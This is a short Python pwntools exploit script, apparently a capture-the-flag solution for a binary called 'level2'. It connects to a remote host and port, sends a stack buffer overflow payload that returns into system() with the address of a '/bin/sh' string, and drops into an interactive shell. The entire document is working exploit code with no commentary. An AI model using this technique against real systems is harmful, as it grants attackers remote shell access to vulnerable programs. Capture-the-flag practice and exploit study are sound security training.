from pwn import *

#sh = process('./level2')

sh = remote('111.198.29.45',30445)

bin_sh = p32(0x0804a024)

sys_addr = p32(0x08048320)

payload = 'a' * 0x88 + 'bbbb' + sys_addr + 'aaaa' + bin_sh

sh.sendline(payload)

sh.interactive()
